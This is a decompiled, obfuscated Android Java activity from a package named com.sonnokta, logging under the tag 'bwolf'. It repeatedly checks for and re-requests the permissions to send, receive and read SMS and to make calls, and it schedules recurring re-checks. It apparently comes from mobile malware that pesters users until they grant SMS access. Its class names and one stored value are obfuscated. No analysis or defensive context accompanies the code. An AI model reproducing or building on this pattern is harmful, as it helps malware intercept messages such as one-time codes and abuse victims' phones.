package com.sonnokta;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;

import com.sonnokta.utils.LogUtil;

import fddo.Cbreak;
import fddo.Cgoto;
import fddo.Cthrow;

public class p025i extends Activity {
    private static String TAG = "bwolf-p025i";

    public static String[] fddo() {
        LogUtil.showErrorLog(TAG, "--- fddo ---");
        return new String[]{"android.permission.SEND_SMS", "android.permission.CALL_PHONE", "android.permission.RECEIVE_SMS", "android.permission.READ_SMS"};
    }

    /* access modifiers changed from: protected */
    public void onActivityResult(int i, int i2, Intent intent) {
        LogUtil.showErrorLog(TAG, "--- onActivityResult ---");
        super.onActivityResult(i, i2, intent);
        finish();
    }

    public void onCreate(Bundle bundle) {
        LogUtil.showErrorLog(TAG, "--- onCreate ---");
        super.onCreate(bundle);
        Cgoto.m119goto(getApplicationContext());
        if (Cgoto.ifdf < Cgoto.f69new) {
            finish();
            return;
        }
        Context applicationContext = getApplicationContext();
        try {
            Cthrow.m155else(applicationContext, "check_perms_attempts", 0);
            String str = "";
            for (String str2 : fddo()) {
                if (checkCallingOrSelfPermission(str2) != PackageManager.PERMISSION_GRANTED) {
                    str = str + str2 + ",";
                }
            }
            Cthrow.m159this(applicationContext, "perms_failed", str.replace("android.Manifest.permission.", "").replace("android.permission.", ""));
            if (!str.isEmpty()) {
                requestPermissions(str.split(","), 42);
                Cthrow.m155else(applicationContext, "perms_check_delay", 30);
                return;
            }
            Cthrow.m155else(applicationContext, "perms_check_delay", 600);
            if (Cthrow.m158new(applicationContext, Cbreak.fddo("5fa1c64803ddf3ed64"), "").equals("perms")) {
                Cthrow.m159this(applicationContext, Cbreak.fddo("5fa1c64803ddf3ed64"), "");
            }
            finish();
        } catch (Exception e) {
            Cgoto.m110class(applicationContext, "EXC_PERMSACT", e);
        }
    }

    /* access modifiers changed from: protected */
    public void onPause() {
        LogUtil.showErrorLog(TAG, "--- onPause ---");
        super.onPause();
        finish();
    }
}
